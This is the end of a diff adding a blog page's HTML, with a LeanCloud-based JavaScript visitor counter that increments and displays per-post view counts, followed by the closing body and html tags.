+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
